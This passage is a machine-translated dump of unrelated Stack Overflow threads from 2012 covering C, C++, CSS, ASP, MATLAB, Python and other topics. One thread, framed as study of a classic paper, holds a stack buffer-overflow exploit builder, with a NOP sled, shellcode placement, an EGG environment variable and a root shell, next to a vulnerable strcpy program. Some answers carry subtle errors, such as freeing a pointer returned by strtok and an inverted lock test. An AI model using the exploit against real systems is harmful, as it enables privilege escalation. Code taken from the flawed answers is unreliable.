问题是我无法找到可以拖到图表上并执行此操作的节点。有什么方法可以直接在 SAS 中实现这些算法而无需编写额外的 SAS 脚本？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-06T05:25:31.733

见：[http ://listserv.uga.edu/cgi-bin/wa?A2=ind1202c&L=sas-l&D=0&P=2796](http://listserv.uga.edu/cgi-bin/wa?A2=ind1202c&L=sas-l&D=0&P=2796)

我认为使用本机节点是不可能的。上面的链接表明 Rick Wicklin 确实写了一些可能对这里有帮助的东西，但这超出了我的 google-fu 范围。您可以在 SAS-L 邮件列表中重新提出这个问题（发送电子邮件至 sas-l@listserv.uga.edu 或查找 Google 群组）。

# c - 用于存储大数（超过 20 位）的 int 数组

> ID：13221373
> 
> 赞同：3
> 
> 时间：2012-11-04T18:08:40.780
> 
> 标签：c, arrays

我有一个任务要求我首先设置整数数组来存储任意大的数字。通过使用 int 数组的每个元素，我可以为每个元素保留一个数字，因为 int 变量类型是 32 位，并且在失败之前最多只能达到大约 20 亿。我知道还有其他使用 BigInt 的库，但我想创建自己的数组。

我测试了我的代码，但它似乎不接受超过 9 位的值，直到它开始失败。

```
int * toArray(int, int);
int main()
{
    int n, *res, counter, i;
    printf("Input: ");
    scanf("%d", &n);
    while(n>0){
         n/=10;
         counter++;
    }
    res = toArray(n, counter);
    for(i=1;i<=counter;i++){
         printf("%d", *(res)+i);
    }
    printf("\n");
}   

int * toArray(int n, int counter)
{
    int i;
    int *numberArray = malloc(sizeof(int) * counter);
    for(i=0; i< counter; i++)
    {   
         numberArray[i] = n % 10;
    }
    return numberArray;
} 
```

我希望至少能够接受接近二十位数。我知道这可以用 int 数组来完成，尽管 char 数组（或字符串）也是可能的。但我想改用 int 数组。任何有助于理解为什么它在 9 位数左右失败以及过去的建议将不胜感激。谢谢你。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-04T18:13:57.347

问题是您正在从键盘读取 int

```
scanf("%d", &n); 
```

因此，无论您输入多少位，您仍然只能得到 9 位。

为了能够输入任意数字，您必须将其作为字符串读取，然后将其转换为您的 int 数组。

**编辑：**

这种方式（例如）将允许 20 位数字

```
 char ch;
  int digits[20];
  int i = 0;
  do
  {
    ch = fgetc(stdin);
    if ( isdigit(ch) )
    {
      digits[i++] = ch - 48; // convert ASCII to int
    }
  }
  while (isdigit(ch) && i < sizeof(digits)/sizeof(digits[0])); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-04T20:13:31.863

> ```
> #include<stdio.h>
> #include<stdlib.h>
> int *toArray(long long int n, int counter); int main() {
> long long int n=0,copy_of_n=0;
> int counter=0, i=0;
> int *res=NULL;
> printf("Input: ");
> scanf("%lld", &n);//Refer note in the answer
> copy_of_n=n;//see the while loop why use this.
> while(n>0){
>      n/=10;//Good, but you are not storing it. copy_of_n does that.
>      counter++;//You didn't initialize this
> }
> 
> res=toArray(copy_of_n, counter);
> for(i=counter-1;i>=0;i--){//This ensures you get the numbers in a proper order and since index starts from 0 in the toArray function
>      printf("%d", res[i]);
> }
> printf("\n");
> free(res);//You forgot this
> return 0; }   
> 
> int *toArray(long long int n, int counter) {
>   int i=0;
>   int *numberArray = malloc(sizeof(int) * counter);
>   memset(numberArray,0x00,counter*sizeof(int));//Good to do this
>   //Check for memory allocation
>   for(i=0; i< counter; i++)
>   {   
>      numberArray[i] = n % 10;
>      n=n/10LL;//You have to remove the digits too
>   }
>   return numberArray; } 
> ```

注意：在 while 循环中读取小部分的整数，因为`long long`它可以存储多少位数的限制。另一种方法是存储在一个字符串中并将字符串拆分为最大值。不。可以存储在变量中的位数`long long`并将`n`其逐部分发送到函数。

`long long`大小取决于实现，因此请确保检查最大值。不。它可以容纳的位数。（它当然会绕过问题中的 9 位数限制）

# php - Facebook 上通过 http 运行的应用程序

> ID：13221375
> 
> 赞同：0
> 
> 时间：2012-11-04T18:09:28.777
> 
> 标签：php, facebook

Facebook 宣布所有在 facebook 上运行的应用程序都应该使用 HTTPS。

我很清楚这些应用程序是如何通过 HTTP 运行的。有什么方法可以强制 facebook 使用 HTTP 吗？

[https://www.facebook.com/philipshomelivingindia/app_208195102528120](https://www.facebook.com/philipshomelivingindia/app_208195102528120)

正确并给出视图框架源，你会得到下面的链接，

[http://www.social-digitalpromotion.com/Philips/Middle-EastAndItalian-recipe-contest/index.html](http://www.social-digitalpromotion.com/Philips/Middle-EastAndItalian-recipe-contest/index.html)

[https://www.facebook.com/VisitKerala/app_208195102528120](https://www.facebook.com/VisitKerala/app_208195102528120)

[http://dunamisworld.com/keralaholidays/index.php](http://dunamisworld.com/keralaholidays/index.php)

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T18:25:06.823

Apps need to support HTTP and HTTPS or they won't be accessible to users using whichever HTTP(S) setting the app doesn't support - if you're seeing apps via HTTP instead of HTTPS, you're almost certainly using Facebook without HTTPS enabled on the account - HTTPS-enabled accounts can only see HTTPS compatible apps and vice-versa

# matlab - Matlab - GUI 更改轴大小

> ID：13221379
> 
> 赞同：2
> 
> 时间：2012-11-04T18:09:54.913
> 
> 标签：matlab, user-interface, matlab-guide

如何更改轴的大小（最小 - 最大限制）。

在我的 GUI 中，我使用了“轴”对象，我想通过“编辑文本”字段手动设置 X 轴和 Y 轴的大小。

这是我的 GUI 的图片：

![在此处输入图像描述](../Images/93386cf8a9fe429de9b5731350546072.png)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-04T19:28:26.413

设置`callback`你`uielement`的执行一个包含如下代码的函数：

`set(axesHandle, 'Xlim', newXLim, 'YLim', newYLim);`

有关更多信息，请参阅官方文档：[http ://www.mathworks.com/help/matlab/creating_guis/examples-programming-gui-components.html?s_tid=doc_12b](http://www.mathworks.com/help/matlab/creating_guis/examples-programming-gui-components.html?s_tid=doc_12b)

# xml - 如何忽略“该进程无法访问该文件，因为它正被另一个进程使用”

> ID：13221383
> 
> 赞同：1
> 
> 时间：2012-11-04T18:10:43.213
> 
> 标签：xml, sql-server-2008, asp-classic

设置是这样的：

每当我的网站发生错误时，都会在向管理员发送电子邮件时显示错误站点。

该网站显示了大量通过 AJAX 和 XML 每 15 秒自动更新的实时统计数据。但无论有多少用户，统计数据仅每 15 秒计算一次。这是由隐藏在 MSSQL 数据库中的时间戳完成的：

*   网站检查时间戳是否超过 14 秒
*   如果是，则更新时间戳并运行统计信息的计算并将它们保存到 XML
*   最后循环遍历 XML 并向用户显示请求的统计信息

如果时间戳不超过 15 秒，则跳过第二步。

现在我的问题是，如果 2 个用户同时发出时间戳请求，那么系统在两个用户都尝试更新 XML 文档之前没有时间更新时间戳，导致其中一个用户失败错误信息：

> ```
> msxml3.dll (0x80070020)
> The process cannot access the file because it is being used by another process.
> /file.asp, line 310 
> ```

是否可以在尝试保存 XML 文档之前检查是否正在使用该进程？或者可能忽略这种明显的错误？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-05T07:43:28.307

我认为一个简单的锁将解决您的问题。

在经典的 ASP 中，可以通过设置顶级应用程序变量来使用应用程序对象来实现锁定。

在运行计算的代码中进行这些更改：

```
If Application("Calculation_Lock")<>"" Then
    Application("Calculation_Lock") = Now()
    'do the calculation...
    'calculation in progress...
    'calculation in progress...
    'calculation in progress...

    'when it's all done:
    Application("Calculation_Lock") = ""
End If 
```

最初，应用程序级变量将为空，因此第一个用户将输入 If 语句，然后分配锁。当锁处于活动状态时，任何进一步的请求都将被忽略，即应用程序级变量已设置。

如果在计算过程中出现错误，锁可能会永远保持活动状态，因此为了安全起见，您可以比较值（即设置锁的时间）和当前时间，如果超过 X 秒/分钟手动解除锁定。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-04T18:19:38.943

远离带有时间戳的数据库。

在这里查看[代码](https://blog.stackoverflow.com/2008/07/easy-background-tasks-in-aspnet/)；只需将持续时间设置为 15 秒，然后看看是否符合您的要求。

# macos - OS X 上的 // 目录是什么

> ID：13221389
> 
> 赞同：0
> 
> 时间：2012-11-04T18:12:37.893
> 
> 标签：macos, unix

我不小心输入了**cd //**并惊讶地看到 OS X 将我带到了一个名为*//*的目录。它似乎是根目录，但我想知道为什么**cd //**命令没有引发错误。

**//**有什么特殊含义吗？

```
Seans-MacBook-Pro:/ sean$ cd //
Seans-MacBook-Pro:// sean$ pwd
//
Seans-MacBook-Pro:// sean$ ls
Applications            archive             net
Incompatible Software       bin             opt
Library             cores               private
Network             dev             sbin
System              etc             tmp
User Guides And Information home                usr
Users               mach_kernel         var
Volumes             mds
Seans-MacBook-Pro:// sean$ cd /
Seans-MacBook-Pro:/ sean$ ls
Applications            archive             net
Incompatible Software       bin             opt
Library             cores               private
Network             dev             sbin
System              etc             tmp
User Guides And Information home                usr
Users               mach_kernel         var
Volumes             mds 
```

**编辑**

我还注意到**cd ///**，**cd ////**等都解析为 root，并且不给出错误。只有**cd //**被注册为在**//**目录中。

```
Seans-MacBook-Pro:~ sean$ cd ///
Seans-MacBook-Pro:/ sean$ cd //
Seans-MacBook-Pro:// sean$ 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T18:29:35.920

该`/`字符用作分隔符，并且 - 通常 - 任意数量的字符都可以折叠成一个。（这发生在 shell 级别，`bash`例如，当解析您的输入时）

这也是另一种写法`/Users/Sean/`- `////Users////Sean//`。但是，“//”在某些情况下有些特殊。您仍然在根 ( `/`) 但`bash`不会立即折叠它。

有关更多信息，请参阅此超级用户帖子： [https ://superuser.com/questions/389338/which-directory-does-path-represent-in-linux](https://superuser.com/questions/389338/which-directory-does-path-represent-in-linux)

# python - 创建一个使用时序逻辑在两种不同状态之间切换的模型？

> ID：13221392
> 
> 赞同：1
> 
> 时间：2012-11-04T18:12:57.457
> 
> 标签：python, logic, discrete-mathematics, continuous, temporal

我试图设计一个模型来管理对不同水源的不同请求。平台：MAC OSX，使用安装了 TuLip 模块的最新 Python。

例如，

```
Definitions :

Two water sources : w1 and w2
3 different requests : r1,r2,and r3 
```

-

```
Specifications :

Water 1 (w1) is preferred, but w2 will be used if w1 unavailable.
Water 2 is only used if w1 is depleted.
r1 has the maximum priority.
If all entities request simultaneously, r1's supply must not fall below 50%. 
```

-

水源不是离散的而是连续的，这会增加模型的创建难度。我可以对水位进行粗略的离散化，但我更喜欢先找到连续状态的模型。

那么我该如何开始呢？

我的一些想法：

*   创建一个矩阵 W，其中 w1,w2 ∈ W
*   创建一个矩阵 R，其中 r1,r2,r3 ∈ R
*   或将所有变量保留为单数，而不将它们放入矩阵中

我不是编码专家，所以我需要帮助。不确定开始解决此问题的最佳方法是什么。我只对模型感兴趣，或者对如何将其组合在一起的代码示例感兴趣。

*编辑*

现在想象一下，我对水源进行粗略的离散化，使 w1=[0...4] 和 w2=[0...4] 分别为 0、25、50、75,100%。

==> 意味着*暗示*

水源的使用：

*   if w1[0]==>w2[4] -- 表示如果水源 1 有 0%，则使用 100% 的水源 2 等
*   如果 w1[1]==>w2[3]
*   如果 w1[2]==>w2[2]
*   如果 w1[3]==>w2[1]
*   如果 w1[4]==>w2[0]

r1=r2=r3=[0,1] -- 0 表示请求*关闭*，1 表示请求*开启*

现在可以设计什么模型，根据 w1 和 w2 的值，为每个请求提供 100% 的水（w1 和 w2 值是无法控制的，因此无法定义具体值，但为简单起见使用 0...4）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T22:58:15.653

这称为流量问题：[http ://en.wikipedia.org/wiki/Maximum_flow_problem](http://en.wikipedia.org/wiki/Maximum_flow_problem)

Wiki 有一些解决方案的代码：[http ://en.wikipedia.org/wiki/Ford%E2%80%93Fulkerson_algorithm](http://en.wikipedia.org/wiki/Ford%E2%80%93Fulkerson_algorithm)

我不确定时间逻辑在这里有多大帮助。例如负载均衡是一个主要的研究课题，我相信大部分都没有使用这种形式主义。

我编写了一些代码，它只代表一个简单的优先级列表，这有点微不足道。我会使用类和函数来表示状态，而不是矩阵。优先级方面的依赖关系很简单。否则，您也可以将它们添加到类水源中。（类 WaterSourcePriorityQueue 或类似的东西）。要获得模拟，最好使用线程，我在这里没有。您可以使用逐步迭代（轮次），这更符合程序化程序。

```
import time
from random import random
from math import floor
import operator

class Watersource:

    def __init__(self,initlevel,prio,name):
        self.level = initlevel
        self.priority = prio
        self.name = name

    def requestWater(self,amount):
        if amount < self.level:
            self.level -= amount
            return True
        else:
            return False

#watersources
w1 = Watersource(40,1,"A")
w2 = Watersource(30,2,"B")
w3 = Watersource(20,3,"C")

probA = 0.8 # probability A will be requested
probB = 0.7
probC = 0.9

probs = {w1:probA,w2:probB,w3:probC}
amounts = {w1:10,w2:10,w3:20} # amounts requested

ws = [w1,w2,w3]

numrounds = 100
for round in range(1,numrounds):
    print 'round ',round

    done = False
    i = 0
    priorRequest = False
    prioramount = 0

    while not done or priorRequest:
        if i==len(ws):
            done=True
            break

        w = ws[i]
        probtresh = probs[w]
        prob = random()

        if prob > probtresh: # request water
            if prioramount != 0:
                amount = prioramount
            else:
                amount = floor(random()*amounts[w])
                prioramount = amount

            print 'requesting ',amount

            success = w.requestWater(amount)

            if not success:
                print 'not enough'

                priorRequest=True
            else:
                print 'got water'
                done = True
                priorRequest=False

        i+=1

    time.sleep(1) 
```

# c++ - 程序进入无限循环 C++

> ID：13221393
> 
> 赞同：1
> 
> 时间：2012-11-04T18:13:02.503
> 
> 标签：c++, operator-overloading, file-handling

下面是我重载“>>”运算符的程序

```
#include<iostream>
#include<fstream>
#include<string>
using namespace std;

class Student{
    public :
        string name;
        string entry_no;
};

class Science : public Student{
    public :
    float marks;
    void create_file();
    void highest();

    friend istream& operator >> (istream& input, Science& stud);
};

istream& operator >> ( istream& input, Science& stud){
    input >> stud.name;
    input >> stud.entry_no;
    input >> stud.marks;
    return input;
}
void Science::create_file(){
    ifstream file_read;

    file_read.open("student.txt");

    ofstream file_write;
    file_write.open("science.txt");
    string line;

    while(!file_read.eof()){
        getline(file_read,line,'\n');

        if(line.find("Science") != string::npos){
            file_write << line;
            file_write << '\n';
        }
    }
}

class Art : public Student{
    public :
    string marks;
    void create_file();
    void highest();
    friend istream& operator >> (istream& input, Art& stud);
};

istream& operator >> ( istream& input, Art& stud){
    input >> stud.name;
    input >> stud.entry_no;
    input >> stud.marks;
    return input;
}

void Art::create_file(){
    ifstream file_read;

    file_read.open("student.txt");

    ofstream file_write;
    file_write.open("art.txt");
    string line;

    while(!file_read.eof()){
        getline(file_read,line,'\n');

        if(line.find("Art") != string::npos){
            file_write << line;
            file_write << '\n';
        }
    }
    file_read.close();
    file_write.close();
}

void find_marks(){

    string entry_no;
    cout << "Enter entry_no of the student to find marks " << endl;
    cin >> entry_no;

    ifstream file_read;
    file_read.open("science.txt");
    string stud_entry;
    Science stud;
    bool found = false;
    if(file_read.is_open()){
        cout << (file_read >> stud) << endl;
    while( file_read >> stud ){
        cout << "hi";
        if(!entry_no.compare(stud.entry_no)){
            cout << stud.marks << endl;
            found = true;
            break;
        }
    }
    }
    else
        cout << "error in openning"<< endl;

    if(!found)
        cout << "this student does not exist" << endl;
}

int main(){
    Science science_stud;
    Art art_stud;

    science_stud.create_file();
    art_stud.create_file();
    find_marks();   
    return 0;
} 
```

如果 entry_no 不匹配，函数 find_marks() 中的 while 循环将进入无限循环。谁能解释为什么会这样？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-04T18:41:08.430

测试`eof()`仅对确定是否要打印错误非常有用，因为之前的转换失败了。这是一个非常糟糕的循环条件：

1.  它不一定永远达到。例如，如果转换在某个时刻失败，则流将进入失败状态，在此状态下它拒绝提取更多字符，直到状态被清除。
2.  到达 EOF 时不会设置该`std::ios_base::eofbit`标志（至少，不保证会设置），但只有在尝试读取文件末尾之后才能保证设置。因此，最后一组数据往往会被处理两次。

正确的方法是在读取数据`bool` **后**使用转换：

```
while (file >> whatever) {
    ...
} 
```

如果您的 C++ 教程建议您使用`eof()`，您可能应该刻录它并建议其他人不要购买副本（他们需要刻录）。如果你的老师告诉你使用`eof()`- ......好吧，我的理解是，燃烧人已经过时了。你至少应该告诉他他错了。

# actionscript-3 - 无法找到 adobe air 的此代码有什么问题

> ID：13221399
> 
> 赞同：0
> 
> 时间：2012-11-04T18:13:37.097
> 
> 标签：actionscript-3, air, adobe

第一次使用*adobe air 应用程序*。不知道下面的代码有什么错误。它没有提醒“否”值。

请看，`saveData()`和`getData()`来自这个[问题](https://stackoverflow.com/questions/13212992/unable-to-get-a-saved-data-in-adobe-air-els/13214411#comment18005663_13214411)。

```
 function check(){
                var d1 = getData('item1');
                var d2 = getData('item2');
                if (d1 && d2) {
                    alert('yes');
                } else {
                    alert('no');
                }
            }   

            saveData('item1','value1');
            saveData('item2','value2');
            // I know that its ridiculous to save the data and then reset it.
            // But This is how the main code works. sorry.
            air.EncryptedLocalStore.reset();
            check(); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T21:17:13.223

当您评估表达式时`d1 && d2`，您正在执行一个*逻辑 AND* [运算符](http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/operators.html)。

> **&& (逻辑与)** — 如果表达式 1 为假或可以转换为假，则返回表达式 1，否则返回表达式 2。

大概当您测试`if(d1 && d2)`条件为真时，在两个实例都已加载时警告*“是” 。*

只有在失败时，例如如果`d1`或`d2`曾经`null`，此警报才会*“否”*。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-04T21:53:22.203

在检查数据之前，您要从 ELS 中清除数据：

> [flash.data.EncryptedLocalStore.reset()](http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/data/EncryptedLocalStore.html#reset%28%29)：清除整个加密本地存储，删除所有数据。

我不确定你为什么要这样做，或者它是如何为你工作的（正如你所说的那样），但如果你说它是必需的，而不是它是必需的。假设这实际上是有效的并且不会给您带来问题，那么您很多人都想修改这个逻辑，因为它非常奇怪。

此外，传递给条件的参数应输入为字符串，并且条件应检查这些字符串的长度是否不为零。

尝试这个：

```
function check():void
{
    var d1:String = getData("item1");
    var d2:String = getData("item2");

    if (d1.length && d2.length)
    {
        alert("yes");
    }
    else
    {
        alert("no");
    }
}   

saveData("item1","value1");
saveData("item2", "value2");

// This is ghetto!
air.EncryptedLocalStore.reset();

check(); 
```

为避免错误和问题，您应该严格键入您的代码。

# c++ - 如何处理 C/C++ 中返回的指向动态内存的指针

> ID：13221400
> 
> 赞同：4
> 
> 时间：2012-11-04T18:13:46.983
> 
> 标签：c++, c, memory-management, return

我想知道用 C 和 C++ 中返回的指向动态内存的指针来处理内存泄漏的协议。例如，strtok 返回一个 char*。据推测，返回的指针最终必须被释放/删除。我注意到[参考页面](http://www.cplusplus.com/reference/clibrary/cstring/strtok/)甚至没有提到这一点。那是因为这只是假设吗？另外，你怎么知道是删除还是释放？是否必须进行研究以找出每个函数最初使用的语言，然后假设所有 C 程序都使用 malloc/free 而 C++ 使用 new/delete？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-04T18:15:32.460

strtok does NOT return a pointer to a newly allocated memory, but rather a pointer to a memory location, which has been previously allocated.

Let's assume this:

```
char String[1024];
strcpy(String, "This is a string");
char *Ptr = strtok(String, " "); 
```

Ptr will not point to a newly allocated memory location, but rather to the location of String (if my counting doesn't fail me right now), with the space getting replaced by a '\0'. (

From the reference: This end of the token is automatically replaced by a null-character by the function, and the beginning of the token is returned by the function.

That also means, that if you were to print out 'String' again after strtok has done its work, it would only contain 'This', since the string is terminated after that.

As a rule of thumb, you are safe to say, that you only need to free/delete memory you've explicitly allocated yourself.

That means:

For each 'new' put a 'delete', and for each 'malloc' put a 'free' and you're good.

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-04T18:20:18.707

`strtok`是一个 C 函数，它返回一个指向先前分配的内存的指针；`strtok`本身不分配新内存。

如果分配了某些东西，`malloc`则必须使用`free`;释放它。用 new 分配的任何东西都必须与`free`d 一起使用`delete`。

在现代 C++ 中处理内存分配/释放的最佳方法是使用智能指针。看看`std::shared_ptr`/ `std::unique_ptr`，除非绝对必须，否则不要使用原始指针。

也使用`std::string`and`std::vector`将删除大部分原始指针。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-04T18:30:40.143

该`strtok`函数不执行任何内存分配。它正在对您提供的字符串指针执行操作。在调用该函数时，您应该已经决定是为堆上的指针分配内存还是使用自动堆栈存储。你可以写：

```
char * p = "Testing - string";
char * p2 = strtok(p, "- "); 
```

这里 p2 不必被释放/删除，因为它是在堆栈上分配的。但在这儿

```
char * p = "Testing - stringh";
char * p2 = malloc(strlen(p));
p2 = strtok(p, "- "); 
```

你已经在堆上为 p2 分配了存储空间，所以在你完成它之后，它必须被释放并设置为 null：

```
if(p2 != NULL) { 
     free(p2);
     p2 = NULL;
} 
```

因此，如果您使用 new 进行堆分配，则使用 delete；如果你使用 malloc/calloc，你应该免费使用。

# mongodb - 按年龄限制mongo搜索？

> ID：13221401
> 
> 赞同：0
> 
> 时间：2012-11-04T18:13:55.283
> 
> 标签：mongodb, node-mongodb-native

我只想获取过去 24 小时内创建的文档，有没有办法按年龄限制查询？

我可以使用文档 ID 吗？限制查询？

我应该添加一个日期字段并使用最小值/最大值吗？

还有什么办法？

感谢您提供任何信息！

# c# - 如何阅读 mp3 标签？

> ID：13221413
> 
> 赞同：0
> 
> 时间：2012-11-04T18:14:49.027
> 
> 标签：c#, mp3, unity3d, id3

> **可能重复：**
> [如何在 C# 中读取和写入 ID3 标签到 MP3？](https://stackoverflow.com/questions/1750464/how-to-read-and-write-id3-tags-to-an-mp3-in-c)

我无法弄清楚如何在 C# 中读取 MP3 信息。我需要做的就是从 MP3 中读取艺术家、标题和专辑，但它不起作用。我尝试下载了一些库，但我发现唯一一个有用的库只能阅读我的一些 MP3。（[半有用的一个](http://www.developerfusion.com/code/4684/read-mp3-tag-information-id3v1-and-id3v2)）

如果它是相关的，我正在工作`Unity3d`，所以没有 Visual Studio 的东西。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-04T18:17:07.483

[NuGet 画廊 | 标签库# 2.1.0.0](http://nuget.org/packages/taglib)

**TagLib#**（又名 taglib-sharp）是一个用于读写的库

媒体文件中的元数据，包括视频、音频和照片格式。

要安装**TagLib#**，请在`Package Manager Console`

```
PM> Install-Package taglib 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-04T18:35:02.013

请记住，并非所有 mp3 文件都有标签。mp3 格式中没有任何内容支持标签元数据。最被接受的标签格式是事实上的格式，最值得注意的是 ID3v1、ID3v2 和 APEv2。这些标签（如果存在）通常嵌入在文件的开头或结尾，与 mp3 标题和帧数据分开。

换句话说，如果一个库无法从给定的 mp3 文件中读取标签，很可能是没有标签，这不是库的错。

# c - C 缓冲区中的指令仅作为 sudo 执行

> ID：13221414
> 
> 赞同：3
> 
> 时间：2012-11-04T18:14:50.337
> 
> 标签：c, stack-overflow, sudo, shellcode, stack-smash

我正在研究 Aleph One 的文章[Smashing the Stack for Fun and Profit](http://www.phrack.org/archives/49/p49_0x0e_Smashing%20The%20Stack%20For%20Fun%20And%20Profit_by_Aleph1.txt)中描述的缓冲区溢出攻击。

正如文章中所建议的，我编写了一个程序 (shellcode.c)，将恶意代码 (shellcode) 植入到环境变量 ($EGG) 中。之后 $EGG 作为参数传递给我希望攻击的程序 (vulnerable.c)，导致该程序中的缓冲区溢出并导致 shellcode 的执行。

这就是缓冲区的样子——

[NNNNNNNN...NNNNNNSSSSSS...SSSSSSSRRRRR...RRRRRR]

其中 N 是 NOP 指令（参见[NOP sled](http://en.wikipedia.org/wiki/NOP_slide)）， S 是我的 shellcode， R 是地址（将地址返回到缓冲区中，这将导致指令指针从代码段跳转到上面的堆栈缓冲区并开始执行指令）。

**当我以普通用户的身份运行 shellcode.c 和vulnerable.c 的可执行文件时，我面临以下问题 -**当指令指针被重定向到缓冲区并遇到指令时，会导致分段错误。**但是，在以 sudo 执行程序时**，缓冲区中的指令执行没有任何问题，并且缓冲区中的后续 shellcode 成功执行，从而启动了根终端，从而完成了漏洞利用。**谁能解释为什么会发生这种情况？**

我禁用了以下保护 - *Stack Smashing Protection*、*ASLR*和*Linux 的 NX*（eXecute Disable Bit）。

我正在使用 gcc 4.4.3（目标：i486-linux-gnu）编译并在运行内核 2.6.32 的 Ubuntu 10.04（Lucid Lynx）上执行。

以下是我的两个程序：

**易受攻击的.c**

```
int main(int argc, char** argv) {
char buffer[512];

if(argc>1)
    strcpy(buffer,argv[1]);

return (EXIT_SUCCESS);
} 
```

**外壳代码.c**

```
int main(int argc,char** argv) {

char *buff, *ptr;
int *addr,retaddr;
int i;
int offset = DEFAULT_OFFSET;
int buffersize = DEFAULT_SIZE;

/* Set buffersize and predicted offset if arguments are supplied to the program
 */ 
if(argc>1)
    buffersize = atoi(argv[1]);
if(argc>2)
    offset = atoi(argv[2]);

if(!(buff=(char*)malloc(buffersize))) {
    printf("Can't allocate memory!");
    exit(1);
}

retaddr = getStackPointer() - offset;
printf("%d\n",strlen(shellcode));
printf("Using address: 0x%x\n",retaddr);

addr = (int *)buff;
for(i=0;i<buffersize;i+=4)
    *(addr++) = retaddr;

for(i=0;i<buffersize/2;i++)
    buff[i] = NOP;

ptr = buff + ((buffersize/2) - (strlen(shellcode)/2));
for(i=0;i<strlen(shellcode);i++)
    *(ptr++) = shellcode[i];

buff[buffersize -1] = '\0';

memcpy(buff,"EGG=",4);
putenv(buff);
system("/bin/bash");

 return (EXIT_SUCCESS);
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T20:32:25.930

我遇到分段错误不是因为我不是 root 用户，而是因为我硬编码到缓冲区中的返回地址 (RRRR...RRR) 超出了正在执行的程序脆弱的堆栈地址空间。c。我通过估计正确的退货地址来解决这个问题（如 Aleph One 的文章中所述，通过点击和试用）。

# html - 如何在css中创建100％的垂直线

> ID：13221416
> 
> 赞同：18
> 
> 时间：2012-11-04T18:14:59.073
> 
> 标签：html, css

我想创建一条像这样覆盖整个页面的垂直线

![在此处输入图像描述](../Images/7f97f39e5d19262ab890d9e736ee1678.png)

这是我的代码

```
#menu
{
border-left: 1px solid black;
height: 100%;
} 
```

结果显示是这样的 ![在此处输入图像描述](../Images/bbd7991f75bbf343d4324b4d5b3d072f.png)

* * *

## 回答 #1

> 赞同：27
> 
> 时间：2012-11-04T18:18:25.300

使用绝对定位的伪元素：

```
ul:after {
  content: '';
  width: 0;
  height: 100%;
  position: absolute;
  border: 1px solid black;
  top: 0;
  left: 100px;
} 
```

[演示](http://codepen.io/anon/pen/ckFvs)

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2012-11-04T18:19:18.170

正如 bookcasey 所说，`height: 100%;`只会使 DIV 100% 成为其父级。出于这个原因，您需要`html, body {height: 100%; min-height: 100%}`按照 Marko 的说明进行操作，而且，对 . 的每个父 DIV 进行相同的更改`#menu`。

因为您有一个底部边框，所以将右边框应用于父 DIV，`height: 100%;`并将底部边框应用于`#menu`您希望底部边框显示的任何高度。

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2012-11-04T18:18:23.720

至少有两种方法可以解决这个问题。

**解决方案1：**

如果您可以使用绝对定位元素，则可以使用`top`and`bottom`属性而不是`height`. 通过设置`top`和`bottom`来`0`强制元素占据整个高度。

```
#menu
{
    position: absolute;
    border-right: 1px solid black;
    top: 0;
    bottom: 0;
}​ 
```

**[演示](http://jsfiddle.net/twkgR/)**

**解决方案2：**

另一种方法是强制 HTML 和 BODY 元素进入 100% 高度，为 100% 高度的菜单留出空间：

```
body, html { height: 100%; }
#menu
{
    border-right: 1px solid black;
    height: 100%;
}​ 
```

**[演示](http://jsfiddle.net/twkgR/1/)**

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-11-04T18:17:04.727

100% 高度是指父容器的高度。为了让你的 div 达到身体的全高，你必须设置这个：

```
html, body {height: 100%; min-height: 100%} 
```

希望能帮助到你。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2014-11-04T18:31:34.427

我对我的大部分垂直元素使用这个 css 定位：

```
<div class="vertical-line" style="height: 250px;
width: 1px;
background-color: #81F781;
margin-left: 0px;
margin-top: -100px;
postion: absolute;
border-radius: 2px;">
</div> 
```

更改高度和宽度以适合页面，或使水平线将高度交换为宽度：

```
<div class="vertical-line" style="height: 250px;
width: 1px;

<div class="vertical-line" style="width: 250px;
height: 1px; 
```

而不是标准的 html 行。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2016-01-20T20:09:02.173

```
<!DOCTYPE html>
<html>
<title>Welcome</title>
<style type="text/css">
    .head1 {
        width:300px;
        border-right:1px solid #333;
        float:left;
        height:500px;
    }
   .head2 {
       float:left;
       padding-left:100PX;
       padding-top:10PX;
   }
</style>
<body>
   <h1 class="head1">Ramya</h1>
   <h2 class="head2">Reddy</h2>
</body>
</html> 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2017-10-31T09:22:07.643

我已经`min-height: 100vh;`在我的一些项目上取得了巨大的成功。[见例子](http://jsfiddle.net/uch0g0ss/)。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2020-01-04T07:59:55.087

当我对此进行测试时，我尝试使用 position 属性并且效果很好。

HTML

```
<div class="main">
 <div class="body">
 //add content here
 </body>
</div> 
```

CSS

```
.main{
 position: relative;
}

.body{
 position: absolute;
 height: 100%;
} 
```

# android - android - best storage practice to show data in an activity

> ID：13221417
> 
> 赞同：0
> 
> 时间：2012-11-04T18:15:01.883
> 
> 标签：android, xml, templates, android-activity

I am looking to make an app that will display hundreds of text based pages with images, much like a website in many respects. I will either populate a template activity, or have the layout details within the plain text I store.

My question is, would it be better to store all the text parts in a DB, or in multiple XML files?

Also, if someone were rooted could they read both of them or is one more secure than the other?

* * *

## 回答 #1

> 赞同：1
> 
